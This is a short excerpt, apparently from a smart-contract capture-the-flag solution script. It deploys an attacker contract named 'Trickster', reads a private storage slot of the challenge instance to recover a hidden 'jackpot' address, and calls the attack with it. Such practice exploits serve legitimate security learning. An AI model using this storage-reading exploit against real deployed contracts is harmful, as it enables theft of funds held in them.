...
from .utils.helper import get_challenge_instance, challenge_broken, w3

CHALLENGE_MANAGER = "0x157EB6396D44F63D3970a72C253BfB5ACEEc80dD"
CHALLENGE_FACTORY = "0xcd94A1D1175e309BE8377A3c30D8b7A718bE4373"
...
def main():
    ...
    hacker = project.Trickster.deploy(sender=user)

    # exploit goes here
    print("\n--- Exploiting challenge instance ---\n")
    jackpot = "0x" + w3.eth.get_storage_at(instance, 1).hex()[26:]
    hacker.attack(jackpot, sender=user)
